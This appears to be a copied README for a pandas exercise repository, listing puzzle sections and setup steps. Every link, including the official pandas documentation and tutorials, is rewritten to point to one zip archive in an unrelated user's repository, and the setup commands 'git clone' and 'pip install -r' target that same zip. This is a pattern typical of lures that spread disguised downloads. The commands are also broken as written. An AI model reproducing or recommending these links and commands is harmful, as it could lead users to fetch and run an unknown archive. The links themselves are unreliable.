# 100 pandas puzzles

### [Puzzles notebook](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip)
### [Solutions notebook](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip)

Inspired by [100 Numpy exerises](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip), here are 100* short puzzles for testing your knowledge of [pandas'](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip) power.

Since pandas is a large library with many different specialist features and functions, these excercises focus mainly on the fundamentals of manipulating data (indexing, grouping, aggregating, cleaning), making use of the core DataFrame and Series objects. Many of the excerises here are straightforward in that the solutions require no more than a few lines of code (in pandas or NumPy - don't go using pure Python!). Choosing the right methods and following best practices is the underlying goal.

The exercises are loosely divided in sections. Each section has a difficulty rating; these ratings are subjective, of course, but should be a seen as a rough guide as to how elaborate the required solution needs to be.

Good luck solving the puzzles!

*\* the list of puzzles is not yet complete! Pull requests or suggestions for additional exercises, corrections and improvements are welcomed.*

## Overview of puzzles

| Section Name  | Description |  Difficulty |
| ------------- | ------------- | ------------- |
| Importing pandas  | Getting started and checking your pandas setup  | Easy |
| DataFrame basics  | A few of the fundamental routines for selecting, sorting, adding and aggregating data in DataFrames  | Easy  |
| DataFrames: beyond the basics  | Slightly trickier: you may need to combine two or more methods to get the right answer  | Medium |
| DataFrames: harder problems  | These might require a bit of thinking outside the box...  | Hard |
| Series and DatetimeIndex  | Exercises for creating and manipulating Series with datetime data  | Easy/Medium |
| Cleaning Data  | Making a DataFrame easier to work with  | Easy/Medium |
| Using MultiIndexes  | Go beyond flat DataFrames with additional index levels  | Medium |
| Minesweeper | Generate the numbers for safe squares in a Minesweeper grid | Hard |
| Plotting | Explore pandas' part of plotting functionality to see trends in data | Medium |

## Setting up

To tackle the puzzles on your own computer, you'll need a Python 3 environment with the dependencies (namely pandas) installed.

One way to do this is as follows. I'm using a bash shell, the procedure with Mac OS should be essentially the same. Windows, I'm not sure about.

1. Check you have Python 3 installed by printing the version of Python:
```
python -V
```

2. Clone the puzzle repository using Git:

```
git clone https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip
```

3. Install the dependencies (**caution**: if you don't want to modify any Python modules in your active environment, consider using a virtual environment instead):

```
python -m pip install -r https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip
```

4. Launch a jupyter notebook server:

```
jupyter notebook --notebook-dir=100-pandas-puzzles
```

You should be able to see the notebooks and launch them in your web browser.

## Contributors

This repository has benefitted from numerous contributors, with those who have sent puzzles and fixes listed in [CONTRIBUTORS](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip).

Thanks to everyone who has raised an issue too.

## Other links

If you feel like reading up on pandas before starting, the official documentation useful and very extensive. Good places get a broader overview of pandas are:

- [10 minutes to pandas](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip)
- [pandas basics](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip)
- [tutorials](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip)
- [cookbook and idioms](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip)
- [Guilherme Samora's pandas exercises](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip)

There are may other excellent resources and books that are easily searchable and purchaseable.
